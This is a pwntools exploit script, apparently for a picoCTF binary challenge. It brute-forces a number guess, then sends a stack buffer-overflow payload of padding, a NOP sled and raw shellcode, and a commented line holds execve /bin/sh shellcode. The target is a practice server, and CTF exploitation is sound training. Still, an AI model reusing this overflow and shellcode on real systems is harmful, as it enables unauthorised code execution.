from pwn import *

context.arch='amd64'

# elf = ELF("./vuln")
# print(hex(elf.symbols['increment']))
# number = 1
# elf.asm(elf.symbols['increment'], 'mov rax,%s\nret\n' % number)
# elf.save('./new')

local = True

if local:
    elf_new = ELF('./vuln')
    p = elf_new.process()
else:
    p = remote('jupiter.challenges.picoctf.org',50583)

return_line = p.recvuntil("?", timeout=1)
number = 100
p.sendline(str(number))
print("Sending:", number)

try_count = 1
while (True):
    return_line = p.recvuntil("?", timeout=1)
    if (b'\nCongrats!' in return_line):
        break
    #print(try_count, return_line)
    try_count += 1 
    p.sendline(str(number))
    print("Sending:", number, " - ", try_count, "try")

print(p.recvuntil("?", timeout=1))



# return_line = p.recvline() # new line
# print("1", return_line)
# return_line = p.recvline() # new line
# if return_line == b"Nope!\n":
#     print(p.recvuntil("?", timeout=1))
#     p.sendline(str(number))

# print("2", return_line)
# return_line = p.recvline() # new line
# print("3", return_line)
# print(p.recvuntil("?", timeout=1))

# rop = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#70

#260 overflow size

payload = b'A'*119
payload += b'\x90'*241
payload += b'\x6A\x01\x6A\x02\x89\xE3\x31\xC9\xB0\xA2\xCD\x80\x31\xDB\x67\x8D\x43\x01\xCD\x80'
#payload += asm(shellcraft.amd64.linux.sh())
#payload = b'\x90'*(0x1000-1-len(payload)) + payload

p.sendline(payload)
print("Sending (PAYLOAD):", payload)
#p.sendline('%{}$s'.format(1))
print(p.recvline())

p.interactive()
# print(p.recvline())
#p.interactive()
# p = process("./vuln")

# print(p.recvuntil("?", timeout=1))

# padding = '-' + ''.join('1'*128)
# p.send(padding)
# print(padding)

# print(p.recvline())
# print(p.recvline())
# print(p.recvline())
# print(p.recvline())
